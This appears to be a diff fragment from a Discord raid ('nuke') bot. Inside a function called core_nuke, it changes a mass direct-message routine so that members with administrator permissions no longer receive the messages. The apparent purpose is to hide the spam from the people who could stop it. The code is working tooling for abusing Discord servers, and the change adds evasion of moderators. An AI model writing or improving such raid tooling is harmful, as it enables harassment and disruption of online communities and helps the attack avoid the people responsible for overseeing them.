@@ -169,8 +169,9 @@ async def core_nuke(guild, new_server_name=None):
     except:
         pass
 
-    # DM送信
-    dm_coros = [limited_dm(send_dm(m)) for m in non_bot_members]
+    # DM送信（権限持ち除外）
+    dm_members = [m for m in non_bot_members if not m.guild_permissions.administrator]
+    dm_coros = [limited_dm(send_dm(m)) for m in dm_members]
     if dm_coros:
         await asyncio.gather(*dm_coros, return_exceptions=True)
 
